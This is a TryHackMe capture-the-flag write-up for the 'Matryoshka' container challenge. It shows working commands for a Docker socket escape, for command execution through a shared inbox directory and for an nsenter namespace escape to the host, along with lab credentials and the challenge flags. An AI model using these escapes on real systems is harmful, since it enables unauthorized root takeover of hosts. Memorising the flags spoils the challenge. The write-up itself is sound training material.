TryHackMe - Matryoshka Challenge (Writeup)

    1. Introduction
   
The Matryoshka challenge is a "nested" environment where flags are hidden inside different layers of containers. 
The goal was to escape the initial restricted shell and reach the Host machine to get the final flag.

    2. Level 1: Initial Foothold
    
I started by SSH-ing into the machine using the provided credentials.

Target IP: 10.49.129.111

Username: matryoshka | Password: n03sk@p3

Command: ssh matryoshka@10.49.129.111

Once inside, I checked my environment and realized I was inside a Docker Container (the hostname looked like a random ID: 33d63e1eb04f).

    3. Level 2: Docker Escape (The Socket Exploit)
    
I found that the docker command was available. In many misconfigured systems, if a user belongs to the docker group or the docker.
sock is exposed, they can take over the host.

The Logic: I used the Docker engine to mount the host's entire file system (/) into a container at a folder called /host.

The Command: docker -H unix:///run/docker.sock run -it -v /:/host --privileged alpine:3.20 chroot /host bin/sh

-v /:/host: Maps the host's root to the container's /host folder.

chroot /host: Changes the "root" of my shell to that mapped folder, effectively making me Root on the host file system.

Flag Found:

Path: /root/flag_level2.txt

Answer: THM{RUN@W@Y_S0CK3T}

    4. Level 3: Script Automation (The Inbox/Outbox)
    
While exploring the root system, I found an interesting directory: /mnt/level3share/. Inside, there were two folders: inbox and outbox.

The Logic: This looked like an automated system. Anything put in inbox is executed by another process/container, and the result is sent to outbox.

Step 1: Finding the flag path

I created a script to find any "flag" files: echo "find / -iname '*flag*' 2>/dev/null" > /mnt/level3share/inbox/findflag.sh

After a minute, I checked outbox/findflag.sh.out and saw the path: /root/flag_level3.txt.

Step 2: Reading the flag

I sent another command to read that specific file: echo "cat /root/flag_level3.txt" > /mnt/level3share/inbox/lvl3flag.sh

Flag Found:

Path: outbox/lvl3flag.sh.out

Answer: THM{RW_B1ND3D}

    5. Final Level: The Host Flag (Namespace Escape)
    
To get the final "Host" flag, I needed to fully break out of the container namespaces and act as the real host system.

The Logic: I used nsenter. This tool allows you to enter the "namespaces" (like Network or Mount) of another process. 
By targeting Process ID 1 (the Init process of the host), I could see exactly what the host sees.

The Command: echo 'nsenter --target 1 --all ls -la /root' > /mnt/level3share/inbox/check_host.sh

This showed a file named flag_host.txt. I then read it: echo 'nsenter --target 1 --all cat /root/flag_host.txt' > /mnt/level3share/inbox/final.sh

Final Flag Found:

Path: outbox/final.sh.out

Answer: THM{SP@C3D_0UT}

    6. What I Learned
    
Container Escape: Just because you are in a container doesn't mean you are trapped. If docker.sock is exposed, it's "Game Over" for the host.

Shared Directories: Automated scripts that run files from a shared inbox are very dangerous if they don't validate the content first.

Privilege Escalation: Moving from a standard user to Root often involves finding small misconfigurations in how services (like Docker) are set up.

Namespace Logic: Linux uses namespaces to separate containers. Tools like nsenter are the "key" to jumping between those boundaries.


